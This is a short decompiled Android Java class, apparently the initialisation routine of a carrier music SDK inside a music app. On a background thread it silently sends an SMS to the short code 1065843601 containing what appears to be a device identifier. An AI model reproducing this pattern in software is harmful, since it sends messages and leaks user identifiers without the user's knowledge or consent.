package com.sds.android.ttpod.cmmusic.b;

import android.content.Context;
import android.telephony.SmsManager;
import com.a.a.a.e;

/* CmMusicSdkInitCode */
public class a {
    public static void a(final Context context) {
        com.sds.android.sdk.lib.e.a.a(new Runnable() {
            public void run() {
                try {
                    SmsManager.getDefault().sendTextMessage("1065843601", null, "CMO_S=" + e.b(context) + "@" + "007317470438422765" + "@S2.1@null", null, null);
                } catch (SecurityException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
